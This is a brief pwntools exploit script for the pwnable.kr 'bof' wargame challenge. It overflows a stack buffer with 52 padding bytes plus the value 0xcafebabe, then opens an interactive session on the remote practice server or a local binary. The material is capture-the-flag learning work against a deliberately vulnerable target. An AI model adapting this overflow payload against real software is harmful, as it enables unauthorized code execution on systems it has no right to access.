#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwnable.kr", 9000)

    return r


def main():
    r = conn()
    
    payload = b'A'*52
    payload += p32(0xcafebabe)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
